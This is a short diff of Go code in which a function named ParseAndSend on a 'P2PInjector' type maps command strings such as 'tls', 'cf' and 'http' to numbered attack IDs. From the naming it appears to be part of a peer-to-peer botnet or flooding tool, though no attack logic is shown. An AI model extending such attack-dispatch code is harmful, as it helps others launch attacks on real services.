@@ -156,7 +156,7 @@ func (this *P2PInjector) ParseAndSend(cmd string) error {
 		attackID = 3
 	case "tls":
 		attackID = 4
-	case "tlsplus":
+	case "http":
 		attackID = 5
 	case "cf":
 		attackID = 6
